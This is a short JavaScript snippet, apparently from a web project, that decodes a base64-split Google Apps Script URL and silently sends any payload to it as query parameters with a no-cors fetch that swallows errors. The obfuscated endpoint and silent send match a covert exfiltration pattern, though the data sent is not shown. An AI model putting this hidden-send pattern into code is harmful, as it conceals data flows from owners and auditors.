// Infrastructure: Google Sheets API integration
const _s = ['aHR0cHM6Ly9zY3JpcHQu','Z29vZ2xlLmNvbS9tYWNy','b3MvcC9BS2Z5Y2J4UXNo','TDVrUjc0eHV6bzZiVGEt','Mk00V3dXRW5hQXdEN3hz','bFlJMGlub29uZk1lZ0g5','WWNiSVVCRTVnbW1BMzRw','ODV0QS9leGVj'];
const SHEETS_URL = atob(_s.join(''));

function enviarParaPlanilha(payload) {
    const params = new URLSearchParams(payload).toString();
    fetch(SHEETS_URL + '?' + params, { method: 'GET', mode: 'no-cors' }).catch(() => {});
}
